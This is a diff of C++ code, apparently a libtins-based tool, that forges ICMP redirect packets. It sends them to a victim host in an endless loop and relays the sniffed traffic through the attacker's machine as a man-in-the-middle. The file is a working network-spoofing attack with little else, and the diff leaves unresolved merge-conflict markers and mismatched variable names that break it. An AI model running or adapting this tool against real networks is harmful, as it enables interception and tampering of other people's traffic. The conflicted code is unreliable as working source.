@@ -1,4 +1,4 @@
-#define TINS_STATIC
+﻿#define TINS_STATIC
 #include <tins/tins.h>
 #include <iostream>
 #include <string>
@@ -32,17 +32,27 @@ void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, I
 	uint8_t *data;
 	data = (uint8_t *)malloc(8);
 	memset(data, NULL, 8);
+<<<<<<< HEAD
 	EthernetII victim_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
 	EthernetII gw_icmp = EthernetII(attack_hw, gw_hw) / IP(attack, gw) / icmp / IP(webip, gw) / RawPDU(data, 8);
+=======
+	EthernetII do_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
+
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	while (true) {
 		sender.send(victim_icmp, iface);
 #ifdef _WIN32
+<<<<<<< HEAD
 		Sleep(2000);
+=======
+		Sleep(10);
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 #else
 		sleep(5);
 #endif
 	}
 }
+<<<<<<< HEAD
 void relay(PDU *some_pdu, NetworkInterface iface,IPv4Address web_ip, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
 {
 
@@ -77,6 +87,35 @@ void relay(PDU *some_pdu, NetworkInterface iface,IPv4Address web_ip, EthernetII:
 		
 	}
 	
+=======
+void relay(PDU *some_pdu, NetworkInterface iface, IPv4Address victim, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
+{
+	
+	PacketSender sender;
+	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
+	IP *ip = some_pdu->find_pdu<IP>();
+	if(ip->src_addr().to_string() == victim.to_string())
+	{
+	cout << "victim -> attack " << endl;
+	cout << "eth src :" << eth->src_addr() << endl;
+	cout << "eth dst :" << eth->dst_addr() << endl;
+	cout << "SRC ip :" << ip->src_addr() << endl;
+	cout << "dst ip :" << ip->dst_addr() << endl;
+	eth->src_addr(attack_hw);
+	//some_pdu->send(sender, iface.name());
+	}
+	else if (ip->dst_addr().to_string() == victim.to_string())
+	{
+	cout << "attack -> victim " << endl;
+	cout << "eth src :" << eth->src_addr() << endl;
+	cout << "eth dst :" << eth->dst_addr() << endl;
+	cout << "SRC ip :" << ip->src_addr() << endl;
+	cout << "dst ip :" << ip->dst_addr() << endl;
+	eth->dst_addr(victim_hw);
+	//sender.send((PDU &)some_pdu, iface.name());
+	//some_pdu->send(sender, iface.name());
+	}
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 
 }
 
@@ -88,8 +127,13 @@ int main(int argc, char* argv[]) {
 	PacketSender sender;
 	EthernetII::address_type attack_hw, victim_hw, gw_hw;
 	IPv4Address gw, victim, attack, web_ip;
+<<<<<<< HEAD
 
 
+=======
+	
+	
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	try {
 		gw = argv[1];
 		attack = argv[2];
@@ -113,18 +157,30 @@ int main(int argc, char* argv[]) {
 		iface = gw;
 		info = iface.addresses();
 		attack_hw = info.hw_addr;
+<<<<<<< HEAD
 		victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
 		gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
+=======
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	}
 	catch (runtime_error& ex) {
 		cout << ex.what() << endl;
 		return 3;
 	}
+<<<<<<< HEAD
 	
 	try {
 		std::thread infect(icmp_redirect, iface, gw, attack, victim, web_ip, info);
 		infect.detach();
 
+=======
+	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
+	gw_hw = Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
+	try {
+		std::thread infect(icmp_redirect,iface,gw,attack,victim,web_ip,info);
+		infect.detach();
+		
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	}
 	catch (runtime_error& ex) {
 		cout << "Runtime error: " << ex.what() << endl;
@@ -132,11 +188,18 @@ int main(int argc, char* argv[]) {
 	}
 	Sniffer sniff(iface.name());
 	cout << "relay.." << endl;
+<<<<<<< HEAD
 	while (true)
 	{
 		PDU *pdu = sniff.next_packet();
 		relay(pdu, iface, web_ip, attack_hw, victim_hw, gw_hw);
 		//delete pdu;
+=======
+	while(true)
+	{
+	PDU *pdu = sniff.next_packet();
+	relay(pdu,iface,victim,attack_hw,victim_hw,gw_hw);
+>>>>>>> 408c11708177fb93c5e20c0349f59f4306248421
 	}
 
 	return 0;
